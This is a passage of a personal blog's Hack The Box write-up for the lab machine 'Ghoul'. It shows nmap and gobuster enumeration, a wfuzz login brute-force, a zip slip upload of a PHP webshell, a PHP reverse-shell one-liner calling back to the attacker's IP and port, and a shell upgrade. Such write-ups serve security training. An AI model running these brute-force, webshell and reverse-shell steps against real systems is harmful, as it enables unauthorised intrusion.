<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Ghoul - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Ghoul"><a href="#Hack-The-Box-Ghoul" class="headerlink" title="Hack The Box - Ghoul"></a>Hack The Box - Ghoul</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is <code>10.10.10.101</code>, I added it to <code>/etc/hosts</code> as <code>ghoul.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/ghoul/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# nmap -sV -sT -sC -o nmapinitial ghoul.htb </span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-10-04 12:47 EET</span><br><span class="line">Nmap scan report for ghoul.htb (10.10.10.101)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)</span><br><span class="line">|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Aogiri Tree</span><br><span class="line">2222&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)</span><br><span class="line">|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)</span><br><span class="line">|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)</span><br><span class="line">8080&#x2F;tcp open  http    Apache Tomcat&#x2F;Coyote JSP engine 1.1</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;Aogiri</span><br><span class="line">|_http-server-header: Apache-Coyote&#x2F;1.1</span><br><span class="line">|_http-title: Apache Tomcat&#x2F;7.0.88 - Error report</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds</span><br></pre></td></tr></table></figure>
<p>We got two <code>ssh</code> ports 22,2222 and two <code>http</code> ports 80,8080. Let’s check the first <code>http</code> port.</p>
<h2 id="Initial-Web-Enumeration"><a href="#Initial-Web-Enumeration" class="headerlink" title="Initial Web Enumeration"></a>Initial Web Enumeration</h2><p>By going to <code>http://ghoul.htb</code> we see a basic static website with nothing really interesting :<br><img src="/images/hackthebox/ghoul/1.png" alt=""><br>So I ran <code>gobuster</code> with the extensions <code>php</code> and <code>html</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# gobuster -u http:&#x2F;&#x2F;ghoul.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x php,html</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;ghoul.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Extensions   : php,html</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;10&#x2F;04 12:53:49 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.hta.php (Status: 403)</span><br><span class="line">&#x2F;.hta.html (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htaccess.php (Status: 403)</span><br><span class="line">&#x2F;.htaccess.html (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.htpasswd.php (Status: 403)</span><br><span class="line">&#x2F;.htpasswd.html (Status: 403)</span><br><span class="line">&#x2F;archives (Status: 301)</span><br><span class="line">&#x2F;blog.html (Status: 200)</span><br><span class="line">&#x2F;contact.html (Status: 200)</span><br><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;secret.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x2F;users (Status: 301)</span><br></pre></td></tr></table></figure>
<p><code>/secret.php</code> and <code>/users</code> look interesting.<br><code>/secret.php</code> :<br><img src="/images/hackthebox/ghoul/2.png" alt=""><br>Of course this user flag was just a troll, but there are two interesting things here, first one is <code>Noro</code> asking <code>Kaneki</code> for access and <code>Kaneki</code> replying with <code>ILoveTouka</code> which looks like a password. The other thing is the fake art site <code>Kaneki</code> talked about which is probably the site running on port 8080.<br><code>/users</code> :<br><img src="/images/hackthebox/ghoul/3.png" alt=""><br><code>ILoveTouka</code> didn’t work as a password so I tried to bruteforce the password with the username <code>admin</code> and I got it (<code>abcdef</code>) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# wfuzz --hh 1073 -c -u http:&#x2F;&#x2F;ghoul.htb&#x2F;users&#x2F;login.php -X POST -d &quot;Username&#x3D;admin&amp;Password&#x3D;FUZZ&amp;Submit&#x3D;Login&quot; -w .&#x2F;darkweb2017-top10000.txt </span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;ghoul.htb&#x2F;users&#x2F;login.php</span><br><span class="line">Total requests: 10000</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000242:  C&#x3D;302      0 L        0 W            0 Ch        &quot;abcdef&quot;</span><br><span class="line">000311:  C&#x3D;200     37 L       81 W         1073 Ch        &quot;12345qwert&quot;^C</span><br><span class="line">Finishing pending requests...</span><br></pre></td></tr></table></figure>
<p>However this was just another troll :<br><img src="/images/hackthebox/ghoul/4.png" alt=""><br><img src="/images/hackthebox/ghoul/5.png" alt=""><br>I couldn’t find anything else on port 80 so I checked port 8080. It had basic <code>http</code> authentication :<br><img src="/images/hackthebox/ghoul/6.png" alt=""><br>But it was easily guessable, <code>admin : admin</code> :<br><img src="/images/hackthebox/ghoul/7.png" alt=""><br><img src="/images/hackthebox/ghoul/8.png" alt=""><br>This is the fake art website <code>Kaneki</code> was talking about, and we can upload images. But we can also upload <code>zip</code> archives :<br><img src="/images/hackthebox/ghoul/9.png" alt=""></p>
<h2 id="Arbitrary-File-Write-Zip-Slip-–-gt-RCE"><a href="#Arbitrary-File-Write-Zip-Slip-–-gt-RCE" class="headerlink" title="Arbitrary File Write (Zip Slip) –&gt; RCE"></a>Arbitrary File Write (Zip Slip) –&gt; RCE</h2><p>The ability to upload zip archives can cause a vulnerability known as <a href="https://snyk.io/research/zip-slip-vulnerability" target="_blank" rel="noopener">zip slip</a>. This happens when the archive has files with directory traversal paths in their names. During extraction, if the target is vulnerable it will write the extracted files to the specified paths in their names.<br>We need to put a shell in <code>/var/www/html</code>, so I copied <code>simple-backdoor.php</code> to <code>/var/www/html</code> then I added it to a zip archive using a lot of <code>../</code> before the file path :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# cd &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">root@kali:&#x2F;var&#x2F;www&#x2F;html# cp &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;simple-backdoor.php .&#x2F;shell.php</span><br><span class="line">root@kali:&#x2F;var&#x2F;www&#x2F;html# zip shell.zip ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php </span><br><span class="line">  adding: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php (deflated 35%)</span><br><span class="line">root@kali:&#x2F;var&#x2F;www&#x2F;html# cd -</span><br><span class="line">&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# mv &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.zip .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul#</span><br></pre></td></tr></table></figure>
<p>This is the easiest way to do it, let’s look at the file with <code>vi</code>, you’ll see the file name :<br><img src="/images/hackthebox/ghoul/10.png" alt=""><br>When this <code>zip</code> is extracted on the machine it will put <code>shell.php</code> in <code>/var/www/html</code>. </p>
<p><img src="/images/hackthebox/ghoul/11.png" alt=""><br><img src="/images/hackthebox/ghoul/12.png" alt=""><br>The shell was successfully uploaded :<br><img src="/images/hackthebox/ghoul/13.png" alt=""><br>Now we can simply get a reverse shell, the usual <code>nc</code> shell didn’t work because <code>nc</code> wasn’t installed on the box so I used <code>php</code> instead :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.10.xx.xx&quot;,1337);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ghoul/14.png" alt=""><br><img src="/images/hackthebox/ghoul/15.png" alt=""></p>
<h2 id="Privilege-Escalation-on-Aogiri-User-Flag"><a href="#Privilege-Escalation-on-Aogiri-User-Flag" class="headerlink" title="Privilege Escalation on Aogiri, User Flag"></a>Privilege Escalation on Aogiri, User Flag</h2><p>First thing I did after getting a shell was to get a stable shell :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ export TERM&#x3D;screen</span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$</span><br></pre></td></tr></table></figure>
<p>Then I checked <code>/home</code>, <code>www-data</code> couldnt access any of the directories :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ cd &#x2F;home&#x2F;</span><br><span class="line">www-data@Aogiri:&#x2F;home$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 1 root   root   4096 Dec 13  2018 .</span><br><span class="line">drwxr-xr-x 1 root   root   4096 Dec 13  2018 ..</span><br><span class="line">drwx------ 1 Eto    Eto    4096 Dec 13  2018 Eto</span><br><span class="line">drwx------ 1 kaneki kaneki 4096 Dec 13  2018 kaneki</span><br><span class="line">drwx------ 1 noro   noro   4096 Dec 13  2018 noro</span><br><span class="line">www-data@Aogiri:&#x2F;home$ cd Eto&#x2F;</span><br><span class="line">bash: cd: Eto&#x2F;: Permission denied</span><br><span class="line">www-data@Aogiri:&#x2F;home$ cd kaneki&#x2F;</span><br><span class="line">bash: cd: kaneki&#x2F;: Permission denied</span><br><span class="line">www-data@Aogiri:&#x2F;home$ cd noro&#x2F;</span><br><span class="line">bash: cd: noro&#x2F;: Permission denied</span><br><span class="line">www-data@Aogiri:&#x2F;home$ cd -</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$</span><br></pre></td></tr></table></figure>
<p>So I had to escalate. By looking at the shell I uploaded I saw that it was created by root :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ ls -la</span><br><span class="line">total 352</span><br><span class="line">drwxr-xr-x 1 root root   4096 Oct  4 11:17 .</span><br><span class="line">drwxr-xr-x 1 root root   4096 Jan 22  2019 ..</span><br><span class="line">drwxr-xr-x 1 root root   4096 Dec 13  2018 archives</span><br><span class="line">-r-xr-xr-x 1 root root  10723 Dec 13  2018 blog.html</span><br><span 